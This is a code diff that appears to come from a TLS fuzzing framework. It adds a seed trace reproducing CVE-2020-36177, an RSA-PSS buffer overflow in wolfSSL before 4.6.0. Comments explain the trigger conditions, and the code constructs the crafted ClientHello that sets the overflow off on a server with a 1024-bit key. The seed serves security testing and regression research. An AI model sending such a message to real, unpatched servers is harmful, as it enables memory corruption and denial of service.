@@ -45,6 +45,100 @@ pub fn create_corpus(
     )
 }
 
+/// <https://nvd.nist.gov/vuln/detail/CVE-2020-36177>
+///
+/// wolfSSL < 4.6.0: `RsaPad_PSS` builds the intermediate value `M' = 0x00*8 || mHash || salt`
+/// *inside* the output buffer, but only checks that the final encoded message fits
+/// (`emLen >= hLen + saltLen + 2`). `M'` is 8 bytes longer, so it overflows the buffer by up to 6
+/// bytes when `emLen` is within 7 bytes of `hLen + saltLen`. With the default salt length this
+/// happens for a 1024-bit RSA key and SHA-512 (salt capped to 62 bytes by FIPS 186-4: `M'` is 134
+/// bytes, the buffer 128).
+///
+/// Reachability class B (PUT configuration) on top of a wire trigger: the server must hold a
+/// 1024-bit RSA key (`TLSDescriptorConfig::server_rsa_1024`, the default PUT keys are 2048-bit) and
+/// the client merely has to list `rsa_pss_rsae_sha512` *first* in `signature_algorithms`
+/// (wolfSSL 4.3.0's `PickHashSigAlgo` stops at the first entry matching the key type, it does not
+/// pick the strongest hash), which makes the server sign its TLS 1.3 CertificateVerify with
+/// RSA-PSS/SHA-512. The overflow happens
+/// while the server processes the ClientHello, so a single attacker message is enough.
+pub fn seed_cve_2020_36177(server: AgentName) -> Trace<TLSProtocolTypes> {
+    let client_hello = term! {
+          fn_client_hello(
+            fn_protocol_version12,
+            fn_new_random,
+            fn_new_session_id,
+            (fn_cipher_suites_make(
+                 (fn_append_cipher_suite(
+                  (fn_new_cipher_suites()),
+                   fn_cipher_suite13_aes_128_gcm_sha256
+            )))),
+            fn_compressions,
+            (fn_client_extensions_make(
+            (fn_client_extensions_append(
+                (fn_client_extensions_append(
+                (fn_client_extensions_append(
+                    (fn_client_extensions_append(
+                        (fn_client_extensions_append(
+                            fn_client_extensions_new,
+                            (fn_support_group_extension_make(
+                                (fn_support_group_extension_append(
+                                    fn_support_group_extension_new,
+                                    fn_named_group_secp384r1
+                                ))
+                            ))
+                        )),
+                        (fn_signature_algorithm_extension(
+                            (fn_supported_signature_schemes_extension_append(
+                                (fn_supported_signature_schemes_extension_append(
+                                    (fn_supported_signature_schemes_extension_append(
+                                        fn_supported_signature_schemes_extension_new,
+                                        fn_sig_scheme_rsa_pss_sha512
+                                    )),
+                                    fn_sig_scheme_rsa_pkcs1_sha256
+                                )),
+                                fn_sig_scheme_rsa_pss_sha256
+                            ))
+                        ))
+                    )),
+                    (fn_key_share_extension_make(
+                        (fn_key_share_extension_append(
+                            fn_key_share_extension_new,
+                            (fn_key_share_deterministic(fn_named_group_secp384r1))
+                        ))
+                    ))
+                )),
+                fn_supported_versions13_extension
+                )),
+                fn_psk_exchange_mode_dhe_ke_extension
+            ))
+        )))
+    };
+
+    Trace {
+        prior_traces: vec![],
+        descriptors: vec![AgentDescriptor::from_config(
+            server,
+            TLSDescriptorConfig {
+                tls_version: TLSVersion::V1_3,
+                typ: AgentType::Server,
+                server_rsa_1024: true,
+                ..TLSDescriptorConfig::default()
+            },
+        )],
+        steps: vec![
+            Step {
+                agent: server,
+                action: Action::Input(input_action! { term! {
+                        @client_hello
+                    }
+                }),
+            },
+            OutputAction::new_step(server),
+        ],
+        ..Default::default()
+    }
+}
+
 /// <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25638>
 pub fn seed_cve_2022_25638(server: AgentName) -> Trace<TLSProtocolTypes> {
     let client_hello = term! {
